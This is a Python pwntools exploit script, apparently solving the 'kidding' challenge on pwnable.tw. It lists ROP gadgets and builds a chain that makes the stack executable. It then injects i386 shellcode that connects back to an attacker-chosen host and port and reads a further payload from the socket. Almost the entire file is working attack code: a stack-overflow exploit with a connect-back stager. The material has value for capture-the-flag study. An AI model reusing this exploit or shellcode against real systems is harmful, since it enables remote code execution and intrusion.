#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

# 0x0806F290 : int 80  ; ret
# 0x080b8536 : pop eax ; ret
# 0x080481c9 : pop ebx ; ret
# 0x080583c9 : pop ecx ; ret
# 0x0806ec8b : pop edx ; ret
# 0x080616c8 : sub eax, ecx ; ret
# 0x0805465c : sub eax, edx ; ret
# 0x080884b9 : sub ebp, ebx ; ret
# 0x0806ec8a : pop ebx ; pop edx ; ret
# 0x0806ecb1 : pop ecx ; pop ebx ; ret
# 0x0806ecb0 : pop edx ; pop ecx ; pop ebx ; ret

# 0x0805bec8 : pop edi ; pop esi ; ret
# 0x08048480 : pop edi ; ret
# 0x08068480 : add eax, ecx ; ret
# 0x0806b1f9 : add esp, 4  ; ret
# 0x080b2e12 : add esp, 0xc; ret
# 0x080b8546 : push esp ; ret
# 0x080492d3 : xor eax, eax ; ret
# 0x080707cf : mov dword ptr [ecx + edx], eax ; mov eax, 0xffffffff ; ret
# 0x0806f265 : mov dword ptr [ecx + 4], eax ; mov eax, ecx ; ret
# 0x08053502 : mov dword ptr [eax + 4], edx ; ret
# 0x0808b62f : mov dword ptr [eax], edx ; mov dword ptr [eax + 8], edx ; mov dword ptr [eax + 0x20], ecx ; ret
# 0x08053502 : mov dword ptr [eax + 4], edx ; ret
from pwn import *
context.log_level="debug"
pwn_file="./kidding"
elf=ELF(pwn_file)
context.arch="i386"
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("chall.pwnable.tw",10303)
    #conn=remote("work",4444)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

p="a"*8
p+=p32(0xffffffff)
p+=p32(0x080b8536) # pop eax
p+=p32(0x7)
p+=p32(0x0806ec8b) # pop edx
p+=p32(0x080E9FEC)
p+=p32(0x0805462b) # mov dword ptr [edx], eax ; ret
p+=p32(0x080b8536) # pop eax
p+=p32(0x080E9FC8) # libc_start_end
p+=p32(0x0809A080) # _dl_make_stack_executable
p+=p32(0x080b8546) # push esp;ret
code = """
    push 0
    push 1
    push 2
    push esp
    pop ecx
    push 1
    pop ebx
    push 0x66
    pop eax
    int 0x80        /* build a socket */
    push 0x0100007f /* replace your host ip */
    push 0xb8220002 /* port 8888*/
    push esp
    pop ecx
    push 0x10
    push ecx
    push eax
    mov ecx,esp
    push 3
    pop ebx
    push 0x66
    pop eax
    int 0x80       /* connect your_ip:8888 */
    xor ebx,ebx
    push 0x7F
    pop edx
    push 0x3
    pop eax
    int 0x80 /* read from socket fd */
"""
p+=asm(code)
conn.send(p)

